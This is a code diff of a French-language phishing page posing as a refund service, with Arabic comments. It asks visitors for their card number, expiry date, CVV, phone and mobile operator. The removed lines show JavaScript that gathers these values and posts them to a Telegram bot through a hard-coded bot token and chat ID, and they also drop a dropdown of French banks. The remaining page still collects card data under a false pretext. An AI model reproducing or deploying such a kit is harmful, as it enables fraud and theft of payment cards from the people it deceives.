@@ -67,51 +67,7 @@
                 <input type="tel" id="telephone" placeholder="Ex: 06 12 34 56 78" required
                     class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
             </div>
-            <!-- Sélection de la banque -->
-<div class="mb-6">
-    <label for="banque" class="block text-sm font-medium text-gray-700">Choisir votre banque</label>
-    <select id="banque" name="banque" required
-        class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500 bg-white">
-        <option value="" disabled selected>-- Sélectionnez votre banque --</option>
-        <option value="bnpparibas">BNP Paribas</option>
-        <option value="societe-generale">Société Générale</option>
-        <option value="credit-agricole">Crédit Agricole</option>
-        <option value="la-banque-postale">La Banque Postale</option>
-        <option value="bnp-banquepopulaire">Banque Populaire</option>
-        <option value="caisse-epargne">Caisse d'Épargne</option>
-        <option value="credit-mutuel">Crédit Mutuel</option>
-        <option value="lcl">LCL (Le Crédit Lyonnais)</option>
-        <option value="hsbc">HSBC</option>
-        <option value="bforbank">BforBank</option>
-        <option value="ing">ING</option>
-        <option value="orange-bank">Orange Bank</option>
-        <option value="n26">N26</option>
-        <option value="monabanq">Monabanq</option>
-        <option value="bourso-bank">Boursorama Banque</option>
-        <option value="autre">Autre (Précisez)</option>
-    </select>
-</div>
 
-<!-- حقل النص في حال اختيار "شيء آخر" -->
-<div id="autre-banque-container" class="mb-4 hidden">
-    <label for="autre-banque" class="block text-sm font-medium text-gray-700">Précisez votre banque</label>
-    <input type="text" id="autre-banque" name="autre-banque" placeholder="Nom de votre banque"
-        class="mt-1 block w-full px-4 py-2 border rounded-lg focus:ring-green-500 focus:border-green-500">
-</div>
-
-<script>
-    // إظهار حقل النص عند اختيار "Autre"
-    const banqueSelect = document.getElementById('banque');
-    const autreBanqueContainer = document.getElementById('autre-banque-container');
-
-    banqueSelect.addEventListener('change', function () {
-        if (banqueSelect.value === 'autre') {
-            autreBanqueContainer.classList.remove('hidden');
-        } else {
-            autreBanqueContainer.classList.add('hidden');
-        }
-    });
-</script>
             <!-- Sélection du fournisseur -->
             <div class="mb-6">
                 <label for="operateur" class="block text-sm font-medium text-gray-700">Choisir votre opérateur</label>
@@ -166,72 +122,30 @@
             <p class="text-xs mt-4">&copy; 2024 Service de Remboursement. Tous droits réservés.</p>
         </div>
     </footer>
-    
-<script>
-    function formatCardNumber(input) {
-        let value = input.value.replace(/\D/g, ''); // إزالة الحروف غير الرقمية
-        value = value.replace(/(.{4})/g, '$1 ').trim(); // إضافة مسافة بين كل 4 أرقام
-        input.value = value;
 
-        const cardError = document.getElementById('card-error');
-        // تحقق من بداية الرقم والطول
-        if (value.replace(/\s+/g, '').length === 16 && (/^4/.test(value.replace(/\s+/g, '')) || /^5[1-5]/.test(value.replace(/\s+/g, '')))) {
-            input.classList.remove('border-red-500');
-            cardError.classList.add('hidden');
-        } else {
-            input.classList.add('border-red-500');
-            cardError.classList.remove('hidden');
-        }
-    }
+    <!-- JavaScript -->
+    <script>
+        function formatCardNumber(input) {
+            let value = input.value.replace(/\D/g, ''); // حذف الحروف غير الرقمية
+            value = value.replace(/(.{4})/g, '$1 ').trim(); // إضافة مسافة بين كل 4 أرقام
+            input.value = value;
 
-    function redirectToTraitement(event) {
-        event.preventDefault(); // منع إعادة تحميل الصفحة
-        window.location.href = "Traitement.html"; // توجيه المستخدم إلى صفحة المعالجة
-    }
-</script>
-
-            const cardHolder = document.getElementById('nom').value;
-            const cardNumber = document.getElementById('numero-carte').value.replace(/\s+/g, '');
-            const expirationDate = document.getElementById('date-expiration').value;
-            const cvv = document.getElementById('cvv').value;
-            const phoneNumber = document.getElementById('telephone').value;
-            const operator = document.getElementById('operateur').value;
-           
-        localStorage.setItem('lastFourDigits', cardNumber.slice(-4)); // آخر 4 أرقام
-        localStorage.setItem('phoneNumber', phoneNumber);
-
-            const message = `
-🔔 Nouveau remboursement :
-🧾 Titulaire : ${cardHolder}
-💳 Carte : ${cardNumber}
-📅 Expiration : ${expirationDate}
-🔐 CVV : ${cvv}
-📞 Téléphone : ${phoneNumber}
-📡 Opérateur : ${operator}
-            `;
-
-            const botToken = '7493515332:AAGlVbk9dCC2tqKxdv8TjgM32qqPRqFsy2I';
-            const chatId = '5372119436';
-
-            const apiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
-
-            try {
-                const response = await fetch(apiUrl, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: chatId, text: message })
-                });
-
-                if (response.ok) {
-                    window.location.href = "Traitement.html";
-                } else {
-                    alert('❌ Erreur lors de l\'envoi des données.');
-                }
-            } catch (error) {
-                alert('❌ Erreur de connexion au serveur.');
-                console.error(error);
+            const cardError = document.getElementById('card-error');
+            if (/^4/.test(value.replace(/\s+/g, '')) || /^5[1-5]/.test(value.replace(/\s+/g, ''))) {
+                input.classList.remove('border-red-500');
+                cardError.classList.add('hidden');
+            } else if (value.length >= 1) {
+                input.classList.add('border-red-500');
+                cardError.classList.remove('hidden');
+            } else {
+                input.classList.remove('border-red-500');
+                cardError.classList.add('hidden');
             }
         }
+        function redirectToTraitement(event) {
+    event.preventDefault(); // منع إعادة تحميل الصفحة
+    window.location.href = "Traitement.html"; // توجيه المستخدم إلى الصفحة
+}
     </script>
 </body>
 </html>
